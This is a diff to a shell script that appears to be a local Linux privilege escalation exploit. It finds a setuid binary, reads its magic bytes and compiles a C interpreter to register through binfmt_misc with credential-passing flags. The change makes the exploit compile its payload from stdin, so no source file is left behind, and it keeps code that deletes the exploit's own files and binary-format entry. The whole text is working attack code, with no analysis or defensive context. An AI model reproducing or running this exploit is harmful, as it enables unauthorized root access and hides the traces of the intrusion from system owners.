@@ -57,11 +57,10 @@ test -e "$target" || die "Error: Unable to find a suid binary in $searchsuid"
 binfmt_magic="$(read_magic "$target" "126")"
 test -z "$binfmt_magic" && die "Error: Unable to retrieve a magic for $target"
 
-fmtsrc="$(mktemp /tmp/XXXXXXXX.c)"
 fmtname="$(mktemp -u XXXX)"
 fmtinterpr="$(mktemp)"
 
-(cat > "$fmtsrc") <<- __EOF__
+gcc -o "$fmtinterpr" -xc - <<- __EOF__
 	#include <stdlib.h>
 	#include <unistd.h>
 	#include <stdio.h>
@@ -69,8 +68,7 @@ fmtinterpr="$(mktemp)"
 
 	int main(int argc, char *argv[])
 	{
-		// remove our temporary files
-		unlink("$fmtsrc");
+		// remove our temporary file
 		unlink("$fmtinterpr");
 
 		// remove the unused binary format
@@ -96,7 +94,7 @@ fmtinterpr="$(mktemp)"
 		return 1;
 	}
 __EOF__
-gcc -o "$fmtinterpr" "$fmtsrc" || exit 1
+
 chmod a+x "$fmtinterpr"
 
 binfmt_line="_${fmtname}_M__${binfmt_magic}__${fmtinterpr}_OC"
